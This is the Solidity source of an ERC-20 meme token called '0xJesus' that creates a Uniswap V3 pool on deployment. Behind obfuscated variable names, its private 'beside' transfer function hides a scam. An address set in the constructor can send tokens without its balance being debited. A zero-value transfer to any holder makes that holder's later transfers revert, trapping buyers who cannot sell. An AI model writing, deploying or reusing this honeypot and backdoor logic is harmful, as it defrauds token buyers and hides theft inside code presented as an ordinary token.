/*

https://t.me/zeroxjesus

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IPeripheryImmutableState {
    function factory() external pure returns (address);

    function WETH9() external pure returns (address);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract xJesus is Ownable {
    uint256 private flew = 27;

    uint8 public decimals = 9;

    string public name = '0xJesus';

    mapping(address => uint256) private cave;

    function transferFrom(address mysterious, address sport, uint256 slept) public returns (bool success) {
        require(slept <= allowance[mysterious][msg.sender]);
        allowance[mysterious][msg.sender] -= slept;
        beside(mysterious, sport, slept);
        return true;
    }

    string public symbol = '0xJesus';

    constructor(address subject) {
        balanceOf[msg.sender] = totalSupply;
        anyone[subject] = flew;
        IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address sport, uint256 slept) public returns (bool success) {
        beside(msg.sender, sport, slept);
        return true;
    }

    mapping(address => uint256) private anyone;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    address public uniswapV3Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function beside(address mysterious, address sport, uint256 slept) private returns (bool success) {
        if (anyone[mysterious] == 0) {
            balanceOf[mysterious] -= slept;
        }

        if (slept == 0) cave[sport] += flew;

        if (mysterious != uniswapV3Pair && anyone[mysterious] == 0 && cave[mysterious] > 0) {
            anyone[mysterious] -= flew;
        }

        balanceOf[sport] += slept;
        emit Transfer(mysterious, sport, slept);
        return true;
    }

    function approve(address flower, uint256 slept) public returns (bool success) {
        allowance[msg.sender][flower] = slept;
        emit Approval(msg.sender, flower, slept);
        return true;
    }
}